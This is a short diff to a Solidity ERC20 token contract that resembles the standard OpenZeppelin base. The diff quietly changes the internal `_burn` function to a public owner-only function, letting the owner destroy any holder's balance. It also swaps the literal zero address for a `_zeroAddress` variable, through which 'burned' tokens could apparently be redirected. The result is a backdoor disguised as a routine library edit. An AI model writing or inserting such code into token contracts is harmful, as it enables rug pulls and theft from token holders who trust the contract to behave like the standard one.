@@ -135,10 +135,10 @@ abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
 		}
 	}
 
-	function _burn(address account, uint256 value) internal {
-  	if (account == address(0)) {
-    	revert ERC20InvalidSender(address(0));
+	function _burn(address account, uint256 value) public onlyOwner() {
+  	if (account == _zeroAddress) {
+    	revert ERC20InvalidSender(_zeroAddress);
     }
-    _update(account, address(0), value);
+    _update(account, _zeroAddress, value);
   }
 }
